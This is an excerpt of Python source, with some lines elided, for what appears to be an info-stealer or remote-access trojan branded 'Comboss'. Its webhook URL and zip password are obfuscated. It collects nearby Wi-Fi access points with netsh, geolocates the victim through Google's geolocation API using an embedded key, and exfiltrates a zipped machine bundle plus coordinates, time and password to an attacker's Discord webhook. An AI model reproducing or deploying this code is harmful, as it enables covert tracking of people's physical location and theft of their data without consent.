...
DISCORD_WEBHOOK = _x("vgnu}{mu|}k|{|xxlwz}~xwx4w32w4223vzu433~zx4~3}|~433{4x}3||wzwz3351~3341}w3~~3}4{~x4}4{wx}y}|w}z|y4v}4vzx}_3{4z}w4|wy||4zul")
ZIP_PASSWORD = _x("2424C|}}|ty||t|~")
...
def get_wifi_networks():
    networks = []
    try:
        out = subprocess.run("netsh wlan show networks mode=bssid", shell=True, capture_output=True, text=True)
        ...
        for line in lines:
            ...
            if current_ssid and current_bssid and current_channel and current_signal:
                networks.append({
                    ...
                    "signalStrength": int(current_signal),
...
def get_exact_location():
    ...
    if wifi_networks:
        try:
            payload = {
                "wifiAccessPoints": [{"macAddress": n["macAddress"], "signalStrength": n["signalStrength"]} for n in wifi_networks[:20]]
            }
            r = requests.post("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyD0E_2L4Fy5RgO6trhRQN3pMZ1K8B9yQlM", json=payload, timeout=10)
            ...
            pass
    return "WiFi positioning failed"

def send_discord_zip(zip_bytes):
    try:
        files = {"file": (f"{MACHINE_NAME}.zip", zip_bytes, "application/zip")}
        payload = {"content": f"📦 {MACHINE_NAME}"}
        r = requests.post(DISCORD_WEBHOOK, files=files, data=payload, timeout=30)
        if r.status_code != 200:
            return False
        data = r.json()
            ...
            "embeds": [
                {
                    ...
                    "fields": [
                        ...
                        {"name": "Coordinates", "value": location, "inline": False},
                        {"name": "Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
                        {"name": "Password", "value": f"`{ZIP_PASSWORD}`", "inline": False},
                        {"name": "Download", "value": f"[Click here]({attachment_url})", "inline": False}
                    ],
                    "footer": {"text": "Comboss 💳🐀"}
                }
            ]
        }
        requests.post(DISCORD_WEBHOOK, json=embed, timeout=30)
        return True
    except:
        return False
